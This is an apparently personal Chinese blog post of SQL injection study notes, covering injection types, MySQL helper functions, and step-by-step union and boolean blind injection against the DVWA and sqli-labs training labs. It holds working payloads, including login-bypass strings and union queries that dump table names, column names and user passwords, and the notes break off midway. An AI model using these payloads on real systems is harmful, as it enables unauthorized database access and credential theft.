<!DOCTYPE html>
<html lang="zh-CN">

  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="keywords" content="" />
  <meta name="author" content="John Doe" />
  <meta name="description" content="" />
  
  
  <title>
    
      疑问 
      
      
      |
    
     瀚霖
  </title>

  
    <link rel="apple-touch-icon" href="/images/favicon.png">
    <link rel="icon" href="/images/favicon.png">
  

  <!-- Raleway-Font -->
  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">

  <!-- hexo site css -->
  
<link rel="stylesheet" href="/css/base.css">
<link rel="stylesheet" href="/iconfont/iconfont.css">
<link rel="stylesheet" href="/css/github-markdown.css">
<link rel="stylesheet" href="/css/highlight.css">


  <!-- jquery3.3.1 -->
  <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>

  <!-- fancybox -->
  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
  <script async src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js"></script>
  
<script src="/js/fancybox.js"></script>


  

<meta name="generator" content="Hexo 5.3.0"></head>


  <body>
    <div id="app">
      <div class="header">
  <div class="avatar">
    <a href="/">
      <!-- 头像取消懒加载，添加no-lazy -->
      
        <img src="/images/avatar.png" alt="">
      
    </a>
    <div class="nickname"><a href="/">小怪</a></div>
  </div>
  <div class="navbar">
    <ul>
      
        <li class="nav-item" data-path="/">
          <a href="/">Home</a>
        </li>
      
        <li class="nav-item" data-path="/archives/">
          <a href="/archives/">Archives</a>
        </li>
      
        <li class="nav-item" data-path="/tags/">
          <a href="/tags/">Tags</a>
        </li>
      
        <li class="nav-item" data-path="/friends/">
          <a href="/friends/">Friends</a>
        </li>
      
        <li class="nav-item" data-path="/about/">
          <a href="/about/">About</a>
        </li>
      
    </ul>
  </div>
</div>


<script src="/js/activeNav.js"></script>



      <div class="flex-container">
        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->

<!-- LaTex Display -->
<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
<script type="text/javascript" id="MathJax-script" async
  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js">
</script>
<script>
MathJax = {
  tex: {
    inlineMath: [['$', '$'], ['\\(', '\\)']]
  }
};
</script>



  

  

  

  
  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
  <div class="container post-details" id="post-details">
    <div class="post-content">
      <div class="post-title">疑问</div>
      <div class="post-attach">
        <span class="post-pubtime">
          <i class="iconfont icon-updatetime" title="更新时间"></i>
          2021-04-20 00:00:00
        </span>
        
              <span class="post-tags">
                <i class="iconfont icon-tags" title="标签"></i>
                
                <span class="span--tag">
                  <a href="/tags/%E5%AE%89%E5%85%A8/" title="安全">
                    <b>#</b> 安全
                  </a>
                </span>
                
              </span>
          
      </div>
      <div class="markdown-body">
        <h1 id="一：sql注入"><a href="#一：sql注入" class="headerlink" title="一：sql注入"></a>一：sql注入</h1><h5 id="什么是sql注入？？？"><a href="#什么是sql注入？？？" class="headerlink" title="什么是sql注入？？？"></a>什么是sql注入？？？</h5><p><code>就是指web应用程序在对用户输入的合法性没有进行严格判断或过滤不严格，导致攻击者可以额外添加sql语句，以此欺骗服务器达到执行非授权的任意查询的动作</code></p>
<h2 id="Ⅰ：数据库基础"><a href="#Ⅰ：数据库基础" class="headerlink" title="Ⅰ：数据库基础"></a>Ⅰ：数据库基础</h2><h4 id="sql中的注释"><a href="#sql中的注释" class="headerlink" title="sql中的注释"></a>sql中的注释</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> database  <span class="number">123</span>        <span class="comment">--创建数据库123&#x27;     --是一个单行注释</span></span><br><span class="line"><span class="comment">/**/</span>               <span class="comment">/*这是创建数据库，这个是一个多行注释*/</span></span><br><span class="line">#                  注释后边的</span><br></pre></td></tr></table></figure>
<h4 id="sql中链接字符串的函数"><a href="#sql中链接字符串的函数" class="headerlink" title="sql中链接字符串的函数"></a>sql中链接字符串的函数</h4><p><a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://baijiahao.baidu.com/s?id=1595349117525189591&wfr=spider&for=pc">concat(),concat_ws()与及group_concat()的用法</a></p>
<p><code>concat(str1,str2,…)</code>——没有分隔符地连接字符串</p>
<p><code>concat_ws(separator,str1,str2,…)</code>——含有分隔符地连接字符串</p>
<p><code>group_concat(str1,str2,…)</code>——连接一个组的所有字符串，知道这三个函数能一次性查出所有信息就行了。</p>
<h3 id="①注入简介"><a href="#①注入简介" class="headerlink" title="①注入简介"></a>①注入简介</h3><ul>
<li>回显正常—&gt; 联合查询 union select</li>
<li>回显报错—&gt; Duplicate entry()<pre><code>                          extractvalue()
          　　       updatexml()</code></pre>
</li>
<li>盲注    —&gt;布尔型盲注<pre><code>       基于时间的盲注sleep()</code></pre>
</li>
</ul>
<h4 id="sql注入原理"><a href="#sql注入原理" class="headerlink" title="sql注入原理"></a>sql注入原理</h4><p>恶意的查询语句执行，是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，来得到数据库内的信息</p>
<h4 id="根据sql数据分类"><a href="#根据sql数据分类" class="headerlink" title="根据sql数据分类"></a>根据sql数据分类</h4><h5 id="1、整形注入"><a href="#1、整形注入" class="headerlink" title="1、整形注入"></a>1、整形注入</h5><h5 id="2、字符型注入"><a href="#2、字符型注入" class="headerlink" title="2、字符型注入"></a>2、字符型注入</h5><h4 id="根据sql注入语法分类"><a href="#根据sql注入语法分类" class="headerlink" title="根据sql注入语法分类"></a>根据sql注入语法分类</h4><p>btuse，可以根据这五个字母进行划分</p>
<h5 id="1、布尔注入（Boolean-based-blind-SQL-injection）"><a href="#1、布尔注入（Boolean-based-blind-SQL-injection）" class="headerlink" title="1、布尔注入（Boolean-based blind SQL injection）"></a>1、布尔注入（Boolean-based blind SQL injection）</h5><p>不会返回结果，只能得到是或者否</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#常用函数</span><br><span class="line">length(str)     #返回str字符串的长度。</span><br><span class="line">substr(str, pos, len)   #将str从pos位置开始截取len长度的字符进 行返回。注意这里的pos位置是从<span class="number">1</span>开始的，不是数组的<span class="number">0</span>开始</span><br><span class="line">mid(str,pos,len) #跟上面的一样，截取字符串</span><br><span class="line">ascii(str)     #返回字符串str的最左面字符的ASCII代码值。</span><br><span class="line">ord(str)         #同上，返回ascii码</span><br><span class="line">if(a,b,c)          #a为条件，a为<span class="literal">true</span>，返回b，否则返回c，如if(<span class="number">1</span><span class="operator">&gt;</span><span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>),返回<span class="number">0</span></span><br><span class="line">limit       #返回a<span class="operator">+</span><span class="number">1</span>到a<span class="operator">+</span>b行的数据 </span><br><span class="line"></span><br><span class="line">#常用语句</span><br><span class="line"><span class="number">1.</span>首先我们需要判断数据库长度 </span><br><span class="line"><span class="string">&#x27; or Length(database()) = 8 #返回true说明数据库长度为8</span></span><br><span class="line"><span class="string">2.获取数据库名字</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">or</span> ord(mid(database(),<span class="number">1</span>,<span class="number">1</span>)) <span class="operator">=</span><span class="string">&#x27;ascill值&#x27;</span>#</span><br><span class="line">依次获取</span><br><span class="line"><span class="number">3.</span>获取表的总数</span><br><span class="line"><span class="string">&#x27; or (select count(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database() )= 2#</span></span><br><span class="line"><span class="string">4.获取表的长度(第一个表)</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">or</span> (<span class="keyword">select</span> length(TABLE_NAME) <span class="keyword">from</span> information_schema.TABLES <span class="keyword">where</span> TABLE_SCHEMA<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span> )<span class="operator">=</span> (猜测得长度)#</span><br><span class="line"><span class="number">5.</span>获取表的内容</span><br><span class="line"><span class="string">&#x27; or  mid((select TABLE_NAME from information_schema.TABLES where </span></span><br><span class="line"><span class="string">TABLE_SCHEMA=database() limit 0,1),1,1)   = &#x27;</span>a<span class="string">&#x27; #</span></span><br><span class="line"><span class="string">6.获取表的字段的总数</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">or</span>  (<span class="keyword">select</span> <span class="built_in">count</span>(COLUMN_NAME) <span class="keyword">from</span> information_schema.COLUMNS <span class="keyword">where</span> TABLE_NAME<span class="operator">=</span>表名 ) <span class="operator">=</span> <span class="number">8</span>#<span class="number">8</span>返回<span class="literal">true</span>说明有<span class="number">8</span>个表</span><br><span class="line">依次类推,最后推出内容。因为是盲猜所以只能这样一个一个去推手工比较麻烦 通常使用sqlmap进行注入</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h5 id="2、时间注入（Time-based-blind-SQL-injection）"><a href="#2、时间注入（Time-based-blind-SQL-injection）" class="headerlink" title="2、时间注入（Time-based blind SQL injection）"></a>2、时间注入（Time-based blind SQL injection）</h5><p>可以根据返回时间长短</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">在MYSQL中有一个函数：sleep（duration）,这个函数的意识是在duration参数给定的秒数之后运行语句，如下<span class="keyword">SQL</span>语句：</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span>  <span class="operator">*</span> <span class="keyword">from</span>  users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> sleep(<span class="number">3</span>);    <span class="comment">/* 3秒之后执行SQL语句*/</span></span><br><span class="line"></span><br><span class="line">#常用参数</span><br><span class="line">sleep()<span class="operator">/</span>延迟函数</span><br><span class="line">if(<span class="keyword">condition</span>,<span class="literal">true</span>,<span class="literal">false</span>)<span class="operator">/</span>若条件为真 返回<span class="literal">true</span>，若条件为假 返回<span class="literal">false</span></span><br><span class="line"><span class="built_in">substring</span>(&quot;string&quot;,strart,length)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">常用语句</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h5 id="3、联合注入（Union-query-SQL-injection）"><a href="#3、联合注入（Union-query-SQL-injection）" class="headerlink" title="3、联合注入（Union query SQL injection）"></a>3、联合注入（Union query SQL injection）</h5><p>过程：</p>
<h5 id="4、多语句查询注入（Stacted-queries-SQL-injection）"><a href="#4、多语句查询注入（Stacted-queries-SQL-injection）" class="headerlink" title="4、多语句查询注入（Stacted queries SQL injection）"></a>4、多语句查询注入（Stacted queries SQL injection）</h5><p>过程：</p>
<h5 id="5、报错注入（Error-based-SQL-injection）"><a href="#5、报错注入（Error-based-SQL-injection）" class="headerlink" title="5、报错注入（Error-based SQL injection）"></a>5、报错注入（Error-based SQL injection）</h5><p>过程：</p>
<h4 id="其他种类注入方式"><a href="#其他种类注入方式" class="headerlink" title="其他种类注入方式"></a>其他种类注入方式</h4><h5 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h5><h6 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h6><h3 id="发现注入点"><a href="#发现注入点" class="headerlink" title="发现注入点"></a>发现注入点</h3><h4 id="1、使用漏洞扫描工具"><a href="#1、使用漏洞扫描工具" class="headerlink" title="1、使用漏洞扫描工具"></a>1、使用漏洞扫描工具</h4><p>OWASP ZAP、D盾、seay</p>
<p>万能密码</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or 1=1 # 用户名和密码都可  </span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">or</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="comment">-- </span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span> 密码才可</span><br></pre></td></tr></table></figure>
<h4 id="2、使用谷歌hacking寻找"><a href="#2、使用谷歌hacking寻找" class="headerlink" title="2、使用谷歌hacking寻找"></a>2、使用谷歌hacking寻找</h4><p>hack语法：</p>
<h2 id="Ⅱ：尝试sql注入"><a href="#Ⅱ：尝试sql注入" class="headerlink" title="Ⅱ：尝试sql注入"></a>Ⅱ：尝试sql注入</h2><h3 id="1、手工注入思路"><a href="#1、手工注入思路" class="headerlink" title="1、手工注入思路"></a>1、手工注入思路</h3><p>1.判断是否存在注入，注入是字符型还是数字型<br>2.猜解 SQL 查询语句中的字段数<br>3.确定显示的字段顺序<br>4.获取当前数据库<br>5.获取数据库中的表<br>6.获取表中的字段名<br>7.显示字段信息</p>
<p><img src=".%5C%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%5C1.png" alt="img"></p>
<h3 id="2、复现"><a href="#2、复现" class="headerlink" title="2、复现"></a>2、复现</h3><p>基于DVWA</p>
<h4 id="1、首先-判断是否存在注入，存在的注入点是字符型和数字型"><a href="#1、首先-判断是否存在注入，存在的注入点是字符型和数字型" class="headerlink" title="1、首先 判断是否存在注入，存在的注入点是字符型和数字型"></a>1、首先 判断是否存在注入，存在的注入点是字符型和数字型</h4><p><code>字符型和数字型最大区别: 数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合的</code><br><code>即：</code><br><code>数字型：select * from table where id =$id</code><br><code>字符型：select * from table where id =‘$id’</code></p>
<p>判断是否为数字型</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span> <span class="operator">=</span> <span class="number">1</span>     #永真</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span> <span class="operator">=</span> <span class="number">2</span>    #永假</span><br><span class="line"></span><br><span class="line">若不报错，则为数字型</span><br></pre></td></tr></table></figure>
<p>判断是否为字符型</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and &#x27;</span> <span class="number">1</span><span class="string">&#x27; =&#x27;</span> <span class="number">1</span> </span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and &#x27;</span> <span class="number">1</span><span class="string">&#x27; =&#x27;</span> <span class="number">2</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; or  &#x27;</span> <span class="number">1</span><span class="string">&#x27; =&#x27;</span> <span class="number">2</span></span><br><span class="line">若页面正常，则为字符型</span><br></pre></td></tr></table></figure>
<p>low源码</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> first_name, last_name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> user_id <span class="operator">=</span> <span class="string">&#x27;$id&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>当我们输入 1 时，此sql语句即是</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> first_name, last_name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> user_id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span></span><br></pre></td></tr></table></figure>
<p>我们进行判断是那种注入方式</p>
<p>当测试到<code>1 &#39;and &#39;1&#39; = &#39;1</code>   时 报错，所以low级别为字符型注入</p>
<h4 id="2-猜解-SQL-查询语句中的字段数"><a href="#2-猜解-SQL-查询语句中的字段数" class="headerlink" title="2.猜解 SQL 查询语句中的字段数"></a>2.猜解 SQL 查询语句中的字段数</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or 1=1 order by 1 #    --查询成功  【order by x 对第几列进行排序】1&#x27;</span>  <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">1</span> #  id<span class="operator">=</span>‘<span class="number">1</span>‘  #’ 注释</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; or 1=1 order by 2 #     --查询成功</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span> #     <span class="comment">--查询失败</span></span><br></pre></td></tr></table></figure>
<p>说明执行的SQL查询语句中只有两个字段，即这里的First name、Surname。</p>
<p>（这里也可以通过输入union select 1,2,3…来猜解字段数）</p>
<h4 id="3、确定显示字段的顺序"><a href="#3、确定显示字段的顺序" class="headerlink" title="3、确定显示字段的顺序"></a>3、确定显示字段的顺序</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,2 #</span></span><br></pre></td></tr></table></figure>
<p>UNION 操作符合并两个或多个 SELECT 语句的结果。</p>
<p>select：select语句用于从数据库中选取数据：例如一个网站的参数传递执行的查询有3个字段，很可能这些字段不是都显示在网页前端的，假如其中的1或2个字段的查询结果是会返回到前端的，那么我们就需要知道这3个字段中哪两个结果会回显，这个过程相当于找到数据库与前端显示的通道。如果我们直接输入查询字段进行查询，语句会非常冗长，而且很可能还需要做很多次测试，这时候我们利用一个简单的select 1,2,3，根据显示在页面上的数字就可以知道哪个数字是这个“通道”，那么我们只需要把这个数字改成我们想查询的内容（如id,password），当数据爆破成功后，就会在窗口显示我们想要的结果。<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44840696/article/details/89166154">SELECT 1,2,3…的含义及其在SQL注入中的用法</a></p>
<h4 id="4、获取当前数据库"><a href="#4、获取当前数据库" class="headerlink" title="4、获取当前数据库"></a>4、获取当前数据库</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,database()#</span></span><br><span class="line"><span class="string">#这样我们就会得到我们当前数据库：当然这个数字没啥含义</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> database(),<span class="number">2</span>#    <span class="comment">--当我们这样输入得到的结果是一样的  </span></span><br></pre></td></tr></table></figure>
<h4 id="5、获取数据库中的表"><a href="#5、获取数据库中的表" class="headerlink" title="5、获取数据库中的表"></a>5、获取数据库中的表</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #      --这是一整个</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;dvwa&#x27;</span> #                   <span class="comment">--两种方式都可以，下边符合我们房前环境，上边比较通用</span></span><br></pre></td></tr></table></figure>
<p>此处用group_concat：可用concat函数替代，只是不集中在一起而已</p>
<p>group_concat：可以把同一分组中的值链接在一起，</p>
<p>此用了information_schema.tables当中存储了数据表的 元数据信息介绍：</p>
<table>
<thead>
<tr>
<th>字段</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>Table_catalog</td>
<td>数据表登记目录</td>
</tr>
<tr>
<td>Table_schema</td>
<td>数据表所属的数据库名</td>
</tr>
<tr>
<td>Table_name</td>
<td>表名称</td>
</tr>
<tr>
<td>Table_type</td>
<td>表类型[system view|base table]</td>
</tr>
<tr>
<td>Engine</td>
<td>使用的数据库引擎[MyISAM|CSV|InnoDB]</td>
</tr>
<tr>
<td>Version</td>
<td>版本，默认值10</td>
</tr>
<tr>
<td>Row_format</td>
<td>行格式[Compact|Dynamic|Fixed]</td>
</tr>
<tr>
<td>Table_rows</td>
<td>表里所存多少行数据</td>
</tr>
<tr>
<td>Avg_row_length</td>
<td>平均行长度</td>
</tr>
<tr>
<td>Data_length</td>
<td>数据长度</td>
</tr>
<tr>
<td>Max_data_length</td>
<td>最大数据长度</td>
</tr>
<tr>
<td>Index_length</td>
<td>索引长度</td>
</tr>
<tr>
<td>Data_free</td>
<td>空间碎片</td>
</tr>
<tr>
<td>Auto_increment</td>
<td>做自增主键的自动增量当前值</td>
</tr>
<tr>
<td>Create_time</td>
<td>表的创建时间</td>
</tr>
<tr>
<td>Update_time</td>
<td>表的更新时间</td>
</tr>
<tr>
<td>Check_time</td>
<td>表的检查时间</td>
</tr>
<tr>
<td>Table_collation</td>
<td>表的字符校验编码集</td>
</tr>
<tr>
<td>Checksum</td>
<td>校验和</td>
</tr>
<tr>
<td>Create_options</td>
<td>创建选项</td>
</tr>
<tr>
<td>Table_comment</td>
<td>表的注释、备注</td>
</tr>
</tbody></table>
<h4 id="6、获取当前表中字段名"><a href="#6、获取当前表中字段名" class="headerlink" title="6、获取当前表中字段名"></a>6、获取当前表中字段名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; #</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> #</span><br></pre></td></tr></table></figure>
<h4 id="7、下载数据（获取字段信息）"><a href="#7、下载数据（获取字段信息）" class="headerlink" title="7、下载数据（获取字段信息）"></a>7、下载数据（获取字段信息）</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #</span></span><br></pre></td></tr></table></figure>


<h2 id="Ⅲ：使用sqlmap注入（待测试）"><a href="#Ⅲ：使用sqlmap注入（待测试）" class="headerlink" title="Ⅲ：使用sqlmap注入（待测试）"></a>Ⅲ：使用sqlmap注入（待测试）</h2><p>sqlmap可以代替我们进行快速自动注入，sqlmap支持MySQL, Oracle,PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird,Sybase和SAP MaxDB等数据库的各种安全漏洞检测</p>
<h3 id="1、sqlmap使用教程"><a href="#1、sqlmap使用教程" class="headerlink" title="1、sqlmap使用教程"></a>1、sqlmap使用教程</h3><h3 id="其他sql注入"><a href="#其他sql注入" class="headerlink" title="其他sql注入"></a>其他sql注入</h3><h4 id="1、sql盲注"><a href="#1、sql盲注" class="headerlink" title="1、sql盲注"></a>1、sql盲注</h4><p>​    盲注只会提示“是”或“不是”</p>
<p><strong>手工盲注步骤</strong>：</p>
<p>1.判断是否存在注入，注入是字符型还是数字型<br>2.猜解当前数据库名<br>3.猜解数据库中的表名<br>4.猜解表中的字段名<br>5.猜解数据</p>
<h6 id="手工盲注常用参数"><a href="#手工盲注常用参数" class="headerlink" title="手工盲注常用参数"></a><strong>手工盲注常用参数</strong></h6><table>
<thead>
<tr>
<th align="left">函数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">left(字符串，截取长度)</td>
<td align="left">从左边截取指定长度的字符串</td>
</tr>
<tr>
<td align="left">length(字符串)</td>
<td align="left">获取字符串的长度</td>
</tr>
<tr>
<td align="left">limit</td>
<td align="left">强制select语句返回的参数</td>
</tr>
<tr>
<td align="left">ascii(字符串)</td>
<td align="left">将指定字符串进行ascii编码</td>
</tr>
<tr>
<td align="left">substr(字符串，start，截取长度)</td>
<td align="left">截取字符串，可以指定起始位置和长度</td>
</tr>
<tr>
<td align="left">mid(字符串，start，截取长度)</td>
<td align="left">截取字符串，可以指定起始位置和长度</td>
</tr>
<tr>
<td align="left">count()</td>
<td align="left">计算总数，返回匹配条件的行数。</td>
</tr>
<tr>
<td align="left">sleep(n)</td>
<td align="left">将程序挂起n秒</td>
</tr>
<tr>
<td align="left">if(参数1，参数2，参数3)</td>
<td align="left">参数1为条件，当参数1返回的结果为true时，执行参数2，否则执行参数3</td>
</tr>
</tbody></table>
<h5 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h5><p>靶机：靶机：sqli-labs第5关</p>
<p>页面没有显示，只能通过页面返回正常与不正常进行判断</p>
<h6 id="手工注入实现："><a href="#手工注入实现：" class="headerlink" title="手工注入实现："></a>手工注入实现：</h6><p>1查看页面变化，判断sql注入类型</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span></span><br><span class="line">【字符型】</span><br></pre></td></tr></table></figure>
<p>2、猜数据库长度</p>
<p>使用length（）判断数据库长度，采用二分法</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and length(database())&gt;5 --+</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> length(database())<span class="operator">&lt;</span><span class="number">10</span> <span class="comment">--+</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and length(database())=8 --+</span></span><br><span class="line"><span class="string">【length=8】</span></span><br></pre></td></tr></table></figure>
<p>3、猜当前裤名</p>
<p><strong>方法1：采用substr函数</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and substr(database(),1,1)&gt;&#x27;</span>r<span class="string">&#x27;--+ ?id=1&#x27;</span> <span class="keyword">and</span> substr(database(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">&lt;</span><span class="string">&#x27;t&#x27;</span><span class="comment">--+ ?id=1&#x27; and substr(database(),1,1)=&#x27;s&#x27;--+ ?id=1&#x27; and substr(database(),2,1)=&#x27;e&#x27;--+ ... ?id=1&#x27; and substr(database(),8,1)=&#x27;y&#x27;--+ </span></span><br><span class="line"><span class="comment">--【security】</span></span><br></pre></td></tr></table></figure>
<p><strong>方法2：使用<code>ascii函数和substr函数</code></strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr(database(),1,1))&gt;114 --+ ?id=1&#x27;</span> <span class="keyword">and</span> ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&lt;</span><span class="number">116</span> <span class="comment">--+ ?id=1&#x27; and ascii(substr(database(),1,1))=115 --+ </span></span><br><span class="line"><span class="comment">--【security】</span></span><br></pre></td></tr></table></figure>
<p><strong>方法3：使用left函数</strong></p>
